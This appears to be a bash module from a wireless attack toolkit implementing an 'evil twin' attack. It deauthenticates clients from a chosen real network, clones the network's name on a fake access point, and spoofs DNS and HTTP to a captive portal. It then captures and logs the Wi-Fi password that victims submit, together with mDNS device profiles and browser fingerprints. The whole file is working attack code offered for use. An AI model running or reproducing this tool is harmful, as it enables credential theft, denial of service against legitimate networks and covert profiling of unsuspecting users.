#!/bin/bash

# Configuration for the Evil Twin network
ET_IP="192.168.1.1"
ET_NET="192.168.1.0/24"
ET_RANGE="192.168.1.2,192.168.1.30"

_ET_MDNS_PID=""
_ET_MDNS_OUT=""
_ET_FP_FILE="/tmp/wificli_fingerprint.txt"

_evil_twin_cleanup() {
    echo
    echo -e "${BOLD_CYAN}[+]${NC} Shutting down evil twin..."

    pkill -f "portal.py"          2>/dev/null
    pkill -f "hostapd /tmp/wificli_hostapd.conf"  2>/dev/null
    pkill -f "dnsmasq --conf-file=/tmp/wificli_dnsmasq.conf" 2>/dev/null
    [[ -n "$_ET_MDNS_PID" ]] && kill "$_ET_MDNS_PID" 2>/dev/null; _ET_MDNS_PID=""

    iptables -t nat -D PREROUTING -i "$iface" -p tcp --dport 80 \
        -j DNAT --to-destination "${ET_IP}:80" 2>/dev/null
    iptables -D FORWARD -i "$iface" -j ACCEPT 2>/dev/null

    ip addr del "${ET_IP}/24" dev "$iface" 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward

    rm -f /tmp/wificli_hostapd.conf /tmp/wificli_dnsmasq.conf \
          /tmp/wificli_captured.txt "$_ET_MDNS_OUT" "$_ET_FP_FILE" 2>/dev/null
    _ET_MDNS_OUT=""
}

evil_twin() {

# Dependency check
local missing=()
command -v hostapd  &>/dev/null || missing+=("hostapd")
command -v dnsmasq  &>/dev/null || missing+=("dnsmasq")
command -v python3  &>/dev/null || missing+=("python3")
command -v iptables &>/dev/null || missing+=("iptables")

if (( ${#missing[@]} > 0 )); then
    echo -e "${BOLD_RED}[!]${NC} Missing dependencies: ${BOLD_YELLOW}${missing[*]}${NC}"
    echo -e "    ${DIM}Install with: apt install ${missing[*]} -y${NC}"
    pause
    return
fi

if [[ -z "$iface" ]]; then
    select_interface
    [[ -z "$iface" ]] && return
fi

# Get scan data — run fresh scan if none available
local results
results=$(_parse_networks 2>/dev/null)

if [[ -z "$results" ]]; then
    echo -e "${BOLD_YELLOW}[*]${NC} No scan data — running network scan first..."
    sleep 1
    ensure_monitor || return
    scan_networks
    results=$(_parse_networks 2>/dev/null)
    if [[ -z "$results" ]]; then
        echo -e "${BOLD_RED}[!]${NC} No networks found."
        pause
        return
    fi
fi

# Pick target
clear
echo -e "${BOLD_RED}========== Evil Twin ==========${NC}"
echo
echo -e "${BOLD_CYAN}Select target network:${NC}"
echo
_display_networks "$results"
echo
read -p "  Select network number: " num

local line
line=$(echo "$results" | sed -n "${num}p")
local target_bssid target_channel target_essid
target_bssid=$(echo "$line"   | cut -d',' -f1)
target_channel=$(echo "$line" | cut -d',' -f2)
target_essid=$(echo "$line"   | cut -d',' -f3)

if [[ -z "$target_bssid" ]]; then
    echo -e "${BOLD_RED}[!]${NC} Invalid selection."
    pause
    return
fi

# Confirm
clear
echo -e "${BOLD_RED}========== Evil Twin ==========${NC}"
echo
echo -e "  ${DIM}Target SSID :${NC} ${BOLD_GREEN}${target_essid}${NC}"
echo -e "  ${DIM}Target BSSID:${NC} ${BOLD_GREEN}${target_bssid}${NC}"
echo -e "  ${DIM}Channel     :${NC} ${BOLD_GREEN}${target_channel}${NC}"
echo
echo -e "  ${DIM}Will:${NC}"
echo -e "  ${DIM}•${NC} Deauth clients off the real network"
echo -e "  ${DIM}•${NC} Spin up fake AP named ${BOLD_GREEN}${target_essid}${NC}"
echo -e "  ${DIM}•${NC} Capture submitted WiFi password via captive portal"
echo
read -p "  Confirm? [y/N] " confirm
[[ "$confirm" =~ ^[Yy]$ ]] || return

# Deauth burst to knock clients off real network before switching modes
if [[ -n "$mon_iface" ]]; then
    echo
    echo -e "${BOLD_CYAN}[+]${NC} Sending deauth burst to knock clients off real network..."
    aireplay-ng --deauth 50 -a "$target_bssid" "$mon_iface" &>/dev/null
    echo -e "${BOLD_CYAN}[+]${NC} Stopping monitor mode..."
    airmon-ng stop "$mon_iface" &>/dev/null
    mon_iface=""
    sleep 1
fi

# Hostapd config — use hw_mode a for 5GHz channels
local hw_mode="g"
(( target_channel >= 36 )) && hw_mode="a"

cat > /tmp/wificli_hostapd.conf << EOF
interface=$iface
driver=nl80211
ssid=$target_essid
hw_mode=$hw_mode
channel=$target_channel
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

# Dnsmasq config — resolves ALL domains to our IP (captive portal trap)
cat > /tmp/wificli_dnsmasq.conf << EOF
interface=$iface
dhcp-range=$ET_RANGE,255.255.255.0,12h
dhcp-option=3,$ET_IP
dhcp-option=6,$ET_IP
listen-address=$ET_IP
address=/#/$ET_IP
EOF

rm -f /tmp/wificli_captured.txt

# Start fake AP
echo
echo -e "${BOLD_RED}[+]${NC} Starting fake AP..."
ip link set "$iface" up
ip addr flush dev "$iface" 2>/dev/null
ip addr add "$ET_IP/24" dev "$iface"

hostapd /tmp/wificli_hostapd.conf &>/dev/null &
sleep 2

# Start DHCP + DNS
echo -e "${BOLD_RED}[+]${NC} Starting DHCP and DNS spoof..."
dnsmasq --conf-file=/tmp/wificli_dnsmasq.conf &>/dev/null &
sleep 1

# Redirect all HTTP traffic to portal
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -i "$iface" -p tcp --dport 80 \
    -j DNAT --to-destination "${ET_IP}:80"
iptables -A FORWARD -i "$iface" -j ACCEPT

# Start captive portal server
local portal_dir="./utils/portal"
python3 "$portal_dir/portal.py" "$ET_IP" &>/dev/null &
sleep 1

# Launch mDNS discovery in background to profile connecting devices
local _core_dir
_core_dir="$(dirname "${BASH_SOURCE[0]}")"
_ET_MDNS_OUT="/tmp/wificli_mdns_$$.txt"
if [[ -x "${_core_dir}/mdns.sh" ]]; then
    bash "${_core_dir}/mdns.sh" -i "$iface" -b tcpdump -d 30 > "$_ET_MDNS_OUT" 2>/dev/null &
    _ET_MDNS_PID=$!
fi

clear
echo -e "${BOLD_RED}[ EVIL TWIN ACTIVE ]${NC}"
echo
echo -e "  ${DIM}SSID    :${NC} ${BOLD_GREEN}${target_essid}${NC}"
echo -e "  ${DIM}Channel :${NC} ${BOLD_GREEN}${target_channel}${NC}"
echo -e "  ${DIM}Portal  :${NC} ${BOLD_GREEN}http://${ET_IP}${NC}"
echo
echo -e "${DIM}  Waiting for a client to connect and submit the password...${NC}"
echo -e "${DIM}  Ctrl+C to stop${NC}"
echo

# Poll for captured password
while true; do
    if [[ -f /tmp/wificli_captured.txt ]]; then
        local captured
        captured=$(cat /tmp/wificli_captured.txt)
        if [[ -n "$captured" ]]; then
            echo
            echo -e "${BOLD_GREEN}╔══════════════════════════════════╗${NC}"
            echo -e "${BOLD_GREEN}║      PASSWORD CAPTURED           ║${NC}"
            echo -e "${BOLD_GREEN}╚══════════════════════════════════╝${NC}"
            echo
            echo -e "  ${DIM}Network  :${NC} ${BOLD_GREEN}${target_essid}${NC}"
            echo -e "  ${DIM}Password :${NC} ${BOLD_GREEN}${captured}${NC}"
            echo
            # Save to log
            local logfile="wifi-cli-captures.log"
            echo "[$(date '+%Y-%m-%d %H:%M:%S')] SSID: ${target_essid} | BSSID: ${target_bssid} | Password: ${captured}" >> "$logfile"
            echo -e "  ${DIM}Saved to ${logfile}${NC}"
            echo

            # Display mDNS device profile if scan completed
            if [[ -n "$_ET_MDNS_PID" ]]; then
                wait "$_ET_MDNS_PID" 2>/dev/null
                _ET_MDNS_PID=""
            fi
            if [[ -s "$_ET_MDNS_OUT" ]]; then
                echo -e "${BOLD_CYAN}========== Device Profile (mDNS) ==========${NC}"
                cat "$_ET_MDNS_OUT"
                echo
            fi
            rm -f "$_ET_MDNS_OUT" 2>/dev/null

            # Display JS browser fingerprint collected by the portal page
            if [[ -f "$_ET_FP_FILE" ]]; then
                echo -e "${BOLD_CYAN}========== Browser Fingerprint (JS) ==========${NC}"
                echo
                while IFS=$'\t' read -r fp_key fp_val; do
                    [[ -n "$fp_key" ]] || continue
                    printf "  ${DIM}%-16s${NC} %s\n" "${fp_key}:" "${fp_val}"
                done < "$_ET_FP_FILE"
                echo
                # Append fingerprint to the log entry
                {
                    echo "  [JS Fingerprint — $(date '+%Y-%m-%d %H:%M:%S')]"
                    while IFS=$'\t' read -r fp_key fp_val; do
                        [[ -n "$fp_key" ]] || continue
                        printf "    %-16s %s\n" "${fp_key}:" "${fp_val}"
                    done < "$_ET_FP_FILE"
                } >> "$logfile"
            fi

            break
        fi
    fi
    sleep 1
done

_evil_twin_cleanup

echo -e "${BOLD_GREEN}[+]${NC} Evil twin shut down. Password is saved to ${BOLD_GREEN}wifi-cli-captures.log${NC}"
pause
}
